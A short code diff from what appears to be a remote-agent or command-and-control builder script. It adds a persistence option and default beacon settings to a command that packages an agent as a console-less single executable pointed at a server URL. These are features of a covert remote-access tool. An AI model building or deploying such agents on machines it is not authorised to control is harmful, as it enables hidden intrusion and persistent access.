@@ -35,7 +35,7 @@ def initdb():
     db.session.commit()
 
 @manager.command
-def buildagent(prog_name, platform, server_url, hello_interval, idle_time, max_failed_connections):
+def buildagent(prog_name, server_url, platform, hello_interval=1, idle_time=60, max_failed_connections=10, persist=False):
     if platform not in ['Linux', 'Windows']:
         print "Supported platforms are 'Linux' and 'Windows'"
         return
@@ -48,8 +48,8 @@ def buildagent(prog_name, platform, server_url, hello_interval, idle_time, max_f
         shutil.rmtree(working_dir)
     shutil.copytree('../agent', working_dir)
     with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
-        agent_config.write("""SERVER = "%s"\nHELLO_INTERVAL = %s\nIDLE_TIME = %s\nMAX_FAILED_CONNECTIONS = %s\n""" %
-          (server_url.rstrip('/'), hello_interval, idle_time, max_failed_connections))
+        agent_config.write("""SERVER = "%s"\nHELLO_INTERVAL = %s\nIDLE_TIME = %s\nMAX_FAILED_CONNECTIONS = %s\nPERSIST = %s\n""" %
+          (server_url.rstrip('/'), hello_interval, idle_time, max_failed_connections, persist))
     cwd = os.getcwd()
     os.chdir(working_dir)
     shutil.move('agent.py', prog_name + '.py')
@@ -61,7 +61,7 @@ def buildagent(prog_name, platform, server_url, hello_interval, idle_time, max_f
         agent_file = os.path.join(working_dir, 'dist', prog_name)
     elif platform == 'Windows':
         if os.name == 'posix': 
-            os.system('wine pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
         else:
             os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
         agent_file = os.path.join(working_dir, 'dist', prog_name + ".exe")
